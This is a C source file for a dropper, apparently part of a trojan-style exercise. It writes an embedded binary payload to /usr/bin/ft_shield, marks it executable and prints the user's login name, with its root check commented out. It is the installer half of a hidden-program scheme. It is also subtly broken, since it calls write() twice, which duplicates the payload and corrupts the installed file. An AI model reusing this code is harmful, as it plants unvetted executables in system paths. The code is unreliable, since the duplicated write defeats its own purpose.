#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <errno.h>

extern const char _binary_payload_start[];
extern const char _binary_payload_end[];

#define TARGET_PATH "/usr/bin/ft_shield"

void write_payload() {
    size_t size = (size_t)(_binary_payload_end - _binary_payload_start);

    int fd = open(TARGET_PATH, O_CREAT|O_WRONLY|O_TRUNC, 0755);
    if (fd < 0) exit(EXIT_FAILURE);

    write(fd, _binary_payload_start, size);
    if (write(fd, _binary_payload_start, size) != (ssize_t) size) {
        close(fd);
        exit(EXIT_FAILURE);
    }

    close(fd);
    
    if (chmod(TARGET_PATH, 0755) == -1) exit(EXIT_FAILURE);
}

int main() {
    // if (geteuid() != 0) {return EXIT_FAILURE;}

    printf("%s\n", getlogin());
    write_payload();
    
    return EXIT_SUCCESS;
}